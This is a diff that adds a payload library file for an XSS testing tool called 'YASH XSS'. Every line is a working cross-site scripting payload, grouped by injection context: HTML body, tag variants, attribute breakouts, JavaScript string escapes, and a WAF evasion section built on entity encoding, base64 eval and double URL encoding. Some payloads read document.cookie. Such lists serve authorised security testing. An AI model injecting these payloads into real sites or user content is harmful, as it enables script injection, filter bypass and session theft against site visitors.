@@ -1,0 +1,65 @@
+# ──────────────────────────────────────────────
+# YASH XSS — Payload Library
+# Load this file via: Custom Payloads File picker in the GUI
+# One payload per line. Lines starting with # are comments.
+# ──────────────────────────────────────────────
+
+# ── HTML Body ──
+<script>alert(document.domain)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<details/open/ontoggle=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<iframe src=javascript:alert(1)></iframe>
+<object data="javascript:alert(1)">
+<svg><animatetransform onbegin=alert(1)>
+<video><source onerror="alert(1)">
+<audio src onloadstart=alert(1)>
+<svg><image href="x" onerror="alert(1)">
+<body onload=alert(1)>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;1&#x29;">
+
+# ── HTML Tag Variants ──
+<a href="javascript:alert(1)">Click Me</a>
+<embed src="javascript:alert(1)"></embed>
+<form action="javascript:alert(1)"><input type=submit>
+<animate onbegin=alert(1) attributeName=x>
+<button formaction="javascript:alert(1)">Test</button>
+<input type="image" src="x" onerror="alert(1)">
+<keygen autofocus onfocus=alert(1)>
+<frameset onload=alert(1)>
+
+# ── HTML Attribute Escapes ──
+" onmouseover=alert(1) "
+" autofocus onfocus=alert(1) "
+" onclick=alert(1) "
+" onpointerenter=alert(1) "
+" onmouseenter=alert(1) "
+" onscroll=alert(1) "
+" formaction=javascript:alert(1) type=submit "
+" oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto "
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+' onfocus=alert(1) autofocus '
+javascript:alert(1)
+
+# ── JavaScript Context / String Escapes ──
+';alert(document.cookie);//
+";alert(document.cookie);//
+'-alert(1)-'
+"-alert(1)-"
+\`;alert(1);//
+window['alert'](1)
+'-alert(document.domain)-'
+\`;alert(document.domain);//
+</script><script>alert(1)</script>
+</script><svg onload=alert(1)>
+
+# ── WAF Evasion ──
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
+eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))
+<svg><script href=data:,alert(1) />
+<details/open/ontoggle="alert`1`">
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+%253Cscript%253Ealert(1)%253C/script%253E
